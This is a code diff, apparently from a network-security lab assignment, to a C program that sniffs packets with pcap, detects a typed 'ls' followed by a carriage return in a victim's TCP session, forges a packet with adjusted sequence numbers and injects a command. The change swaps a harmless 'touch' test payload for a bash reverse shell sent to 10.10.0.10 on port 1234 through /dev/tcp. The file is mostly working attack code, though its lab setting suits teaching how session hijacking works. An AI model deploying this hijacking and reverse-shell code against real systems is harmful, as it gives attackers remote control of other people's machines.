@@ -20,6 +20,7 @@
 #define HOST_B_MAC "7e:8f:c5:5e:f3:09"
 
 char prevLetter = '\0';
+char prevLetter2 = '\0';
 
 static int
 is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
@@ -34,10 +35,14 @@ is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
     uint16_t tcp_hdr_len = tcphdr->doff * 4;
     char *data = (char *) tcphdr + tcp_hdr_len;
     //printf("prev letter is: %c\n", prevLetter);
-    if (*data == 's' && prevLetter == 'l') {
+    if (*data == '\r' && prevLetter == 's' && prevLetter2 == 'l') {
+      prevLetter2 = prevLetter;
       prevLetter = *data;
       return 1;
+    } else if (*data == 's' && prevLetter == 's') {
+      return 0;
     } else {
+      prevLetter2 = prevLetter;
       prevLetter = *data;
       return 0;
     }
@@ -78,9 +83,8 @@ hijack_tcp_connect(const u_char *pkt, struct iphdr *ip, struct tcphdr *tcp,
   //  5. Set the new sequence number (we want this to be in the future).
   size_t payload_len = 1;
   new_tcp->seq = htonl(ntohl(tcp->seq) + payload_len);
-  new_tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + payload_len);
-  //new_tcp->seq = tcp->seq;
-  //new_tcp->ack_seq = tcp->ack_seq;
+  //new_tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + payload_len);
+  new_tcp->ack_seq = tcp->ack_seq;
 
   //  6. Write the data into your packet. What should the command start and end
   //     with?
@@ -158,8 +162,8 @@ parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
   //    NOTE: is_triggered might need to work across packets.
   if(is_triggered(ip, tcp)) {
     nlen = len;
-    npkt = hijack_tcp_connect(pkt, ip, tcp, "\rtouch /volumes/pwnd.txt\r", &nlen);
-    //npkt = hijack_tcp_connect(pkt, ip, tcp, "\n/bin/bash -i &> /dev/tcp/10.10.0.10 0<&1\n", &nlen);
+    //npkt = hijack_tcp_connect(pkt, ip, tcp, "\rtouch /volumes/pwnd.txt\r", &nlen);
+    npkt = hijack_tcp_connect(pkt, ip, tcp, "\r/bin/bash -i &> /dev/tcp/10.10.0.10/1234 0<&1\r", &nlen);
     if (nlen > 0) {
       //sleep(1);
       int nrc = pcap_inject(handle, npkt, nlen);
